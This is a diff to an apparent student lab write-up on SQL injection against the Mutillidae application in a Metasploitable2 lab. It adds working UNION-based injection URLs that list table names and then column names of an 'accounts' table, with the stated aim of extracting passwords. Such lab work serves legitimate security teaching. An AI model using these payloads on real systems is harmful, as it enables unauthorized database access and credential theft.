@@ -85,5 +85,22 @@ The url when executed, we obtain the necessary information about the database na
 Replace the query in the url with the following one: union select 1,table_name,null,null,5 from information_schema.tables where table_schema = ‘owasp10’
 
 http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,table_name,null,null,5%20from%20information_schema.tables%20where%20table_schema=%27owasp10%27%23&password=&user-info-php-submit-button=View+Account+Details
+![eth 8 23](https://github.com/hema-dharshini5/sqlinjection/assets/147117728/644d7f1c-3039-494b-a622-8799c41f3ebc)
+The url once executed will retrieve table names from the “owasp 10” database. ##Extracting sensitive data such as passwords
+
+When the attacker knows table names, he needs to discover what the column names are to extract data.
+
+In MySQL, the table “information_schema.columns” gives data about columns in tables. One of the most useful columns to extract is called “column_name.”
+
+Ex: (union select 1,colunm_name,null,null,5 from information_schema.columns where table_name = ‘accounts’).
+
+Here we are trying to extract column names from the “accounts” table.
+![eth 8 24](https://github.com/hema-dharshini5/sqlinjection/assets/147117728/618b3e09-dc41-494b-83b2-572dc28d5074)
+The column names of the accounts is displayed below for the following url:
+
+http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,column_name,null,null,5%20from%20information_schema.columns%20where%20table_name=%27accounts%27%23&password=&user-info-php-submit-button=View+Account+Details
+
+
+
 ## RESULT:
 The SQL Injection vulnerability is successfully exploited using the Multidae web application in Metasploitable2.
